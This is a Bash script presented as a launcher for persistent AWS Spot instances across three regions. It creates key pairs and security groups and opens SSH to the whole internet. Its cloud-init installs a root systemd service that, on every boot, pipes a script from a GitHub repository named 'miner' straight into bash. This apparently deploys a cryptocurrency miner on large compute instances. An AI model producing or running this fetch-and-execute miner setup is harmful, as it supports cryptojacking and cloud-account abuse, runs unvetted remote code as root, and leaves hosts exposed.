#!/usr/bin/env bash
# ============================================================
#  spot_persistent_always_userdata.sh
#  Version : 2025‑07‑02
#  Purpose : Launch Spot persistent (stop/restore) instances
#            and guarantee that remote user‑script runs on
#            *every* boot via systemd service.
# ============================================================
set -euo pipefail

# ---------- 1) Region → AMI mapping ----------
declare -A region_image_map=(
  [us-east-1]="ami-0e2c8caa4b6378d8c"
  [us-west-2]="ami-05d38da78ce859165"
  [us-east-2]="ami-0cb91c7de36eed2cb"
)

# ---------- 2) Remote shell script (chạy mỗi boot) ----------
remote_script_url="https://raw.githubusercontent.com/hieudv194/miner/refs/heads/main/vixmrLM-64"

# ---------- 3) Build cloud‑init & encode Base64 ----------
cloud_cfg=$(mktemp)
cat > "$cloud_cfg" <<EOF
#cloud-config
write_files:
  - path: /usr/local/bin/remote_user_data.sh
    owner: root:root
    permissions: '0755'
    content: |
      #!/usr/bin/env bash
      echo "[\$(date '+%F %T')] Fetch & run remote script" >> /var/log/remote_user_data.log
      curl -sL "$remote_script_url" | bash -s >> /var/log/remote_user_data.log 2>&1

  - path: /etc/systemd/system/remote-user-data.service
    owner: root:root
    permissions: '0644'
    content: |
      [Unit]
      Description=Run remote user‑data on every boot
      After=network-online.target

      [Service]
      Type=simple
      ExecStart=/usr/local/bin/remote_user_data.sh
      Restart=always

      [Install]
      WantedBy=multi-user.target

runcmd:
  - systemctl daemon-reload
  - systemctl enable --now remote-user-data.service
EOF

user_data_base64=$(base64 -w 0 "$cloud_cfg")   # macOS: base64 -b 0
rm -f "$cloud_cfg"

# ---------- 4) Loop through regions ----------
for region in "${!region_image_map[@]}"; do
  echo -e "\n============== REGION: $region =============="
  image_id="${region_image_map[$region]}"
  key_name="KeyPairOhiov-$region"
  sg_name="Random-$region"

  # --- Key Pair ---
  if aws ec2 describe-key-pairs --key-names "$key_name" --region "$region" >/dev/null 2>&1; then
    echo "✔ KeyPair $key_name đã tồn tại."
  else
    aws ec2 create-key-pair --key-name "$key_name" --region "$region" \
        --query "KeyMaterial" --output text > "${key_name}.pem"
    chmod 400 "${key_name}.pem"
    echo "➕ Đã tạo KeyPair $key_name."
  fi

  # --- Security Group ---
  sg_id=$(aws ec2 describe-security-groups \
            --group-names "$sg_name" \
            --region "$region" \
            --query "SecurityGroups[0].GroupId" --output text 2>/dev/null || true)
  if [[ -z "$sg_id" || "$sg_id" == "None" ]]; then
    sg_id=$(aws ec2 create-security-group \
              --group-name "$sg_name" \
              --description "SG for $region Spot" \
              --region "$region" \
              --query "GroupId" --output text)
    echo "➕ Đã tạo SG $sg_name ($sg_id)."
  else
    echo "✔ SG $sg_name ($sg_id) đã tồn tại."
  fi

  # mở SSH 22 nếu chưa có
  if ! aws ec2 describe-security-group-rules --region "$region" \
         --filters Name=group-id,Values="$sg_id" \
                   Name=ip-permission.from-port,Values=22 \
                   Name=ip-permission.to-port,Values=22 \
                   Name=ip-permission.cidr,Values=0.0.0.0/0 \
         --query "length(SecurityGroupRules)" --output text | grep -q '^1$'; then
    aws ec2 authorize-security-group-ingress \
       --group-id "$sg_id" --protocol tcp --port 22 --cidr 0.0.0.0/0 \
       --region "$region"
    echo "🔓 Đã mở cổng SSH 22."
  fi

  # --- Subnet (lấy subnet đầu tiên trong default VPC) ---
  subnet_id=$(aws ec2 describe-subnets --region "$region" \
               --filters Name=default-for-az,Values=true \
               --query "Subnets[0].SubnetId" --output text)
  if [[ -z "$subnet_id" || "$subnet_id" == "None" ]]; then
    echo "⚠ Không tìm thấy Subnet khả dụng trong $region → bỏ qua."
    continue
  fi

  # --- Build launch specification JSON file ---
  launch_spec=$(mktemp)
  cat > "$launch_spec" <<JSON
{
  "ImageId": "$image_id",
  "InstanceType": "c7a.16xlarge",
  "KeyName": "$key_name",
  "SecurityGroupIds": ["$sg_id"],
  "SubnetId": "$subnet_id",
  "UserData": "$user_data_base64"
}
JSON

  # --- Request Spot persistent (stop) ---
  spot_req_id=$(aws ec2 request-spot-instances \
      --instance-count 1 \
      --type persistent \
      --instance-interruption-behavior stop \
      --launch-specification file://"$launch_spec" \
      --region "$region" \
      --query "SpotInstanceRequests[0].SpotInstanceRequestId" \
      --output text)

  rm -f "$launch_spec"
  echo "📨 Spot request: $spot_req_id → chờ cấp..."
  aws ec2 wait spot-instance-request-fulfilled \
      --spot-instance-request-ids "$spot_req_id" \
      --region "$region"
  echo "✅ Spot Instance (request $spot_req_id) đã được cấp xong."
done

echo -e "\n🎉  HOÀN TẤT!  UserData sẽ luôn chạy ở mỗi lần boot."
